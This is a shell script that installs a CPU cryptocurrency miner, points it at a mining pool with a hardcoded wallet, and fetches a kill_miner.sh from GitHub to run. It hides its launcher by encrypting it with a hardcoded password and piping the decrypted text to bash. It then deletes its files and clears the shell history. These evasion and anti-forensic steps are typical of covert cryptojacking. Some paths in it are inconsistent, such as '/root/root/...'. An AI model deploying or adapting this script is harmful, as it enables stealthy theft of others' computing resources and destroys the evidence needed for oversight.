#!/bin/sh
password="danielchau@123#"
rm -fR /root/cpuminer-opt-linux/
rm -fR /root/cpuminer-opt-aurum-prerelease/
rm -fv *

sudo apt-get update -y
sudo apt-get install cpulimit -y
wget --no-check-certificate -O cpuminer-opt-aurum.tar.gz https://github.com/barrystyle/cpuminer-opt-aurum/archive/refs/tags/prerelease.tar.gz
tar -xvf cpuminer-opt-aurum.tar.gz
chmod +x ./cpuminer-opt-aurum-prerelease/* 
cd cpuminer-opt-aurum-prerelease
sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
sudo apt-get install -y lib32z1-dev
chmod +x build.sh
./build.sh
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))

#find best servers
servers=("au.mining4people.com" "br.mining4people.com" "de.mining4people.com" "fi.mining4people.com" "in.mining4people.com" "na.mining4people.com" "sg.mining4people.com")
fastest_server=""
min_latency=999999
for server in "${servers[@]}"; do
    latency=$(ping -c 2 $server | awk '/^rtt/ { print $4 }' | cut -d '/' -f 2)
    if (( $(echo "$latency < $min_latency" | bc -l) )); then
        min_latency=$latency
        fastest_server=$server
    fi
done
echo "$fastest_server with min_latency is: $latency"
cat >>/root/root/cpuminer-opt-aurum-prerelease/config.json <<EOF
{
  "url": "stratum+tcp://$fastest_server:3442",
  "user": "bit1qurhknpxt5k8vwz0snrg9xnyvgdnk4asc9skgtx.Linode2"
}
EOF
cat /dev/null > /root/cpuminer-opt-aurum-prerelease/danielluis1921.sh
cat >>/root/cpuminer-opt-aurum-prerelease/danielluis1921.sh <<EOF
#!/bin/bash
./root/cpuminer-opt-aurum-prerelease/kill_miner.sh
sleep 3
sudo ./root/cpuminer-opt-aurum-prerelease/cpuminer --background --threads=$cores -a Aurum -c config.json -p m=solo
sleep 3
EOF
openssl enc -aes-256-cbc -salt -pbkdf2 -in /root/cpuminer-opt-aurum-prerelease/danielluis1921.sh -out /root/cpuminer-opt-aurum-prerelease/danielluis1922.sh -k $password
rm -fv /root/cpuminer-opt-aurum-prerelease/danielluis1921.sh
chmod +x /root/cpuminer-opt-aurum-prerelease/danielluis1922.sh

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/cpuminer-opt-aurum-prerelease/kill_miner.sh
chmod +x /root/cpuminer-opt-aurum-prerelease/kill_miner.sh
./root/cpuminer-opt-aurum-prerelease/kill_miner.sh
sleep 3
openssl enc -d -aes-256-cbc -pbkdf2 -in /root/cpuminer-opt-aurum-prerelease/danielluis1922.sh -k $password | bash
rm -fv *
rm -fR /root/cpuminer-opt-linux/
rm -fR /root/cpuminer-opt-aurum-prerelease/
rm -fR xmrig-6.21.0/
history -c && history -w
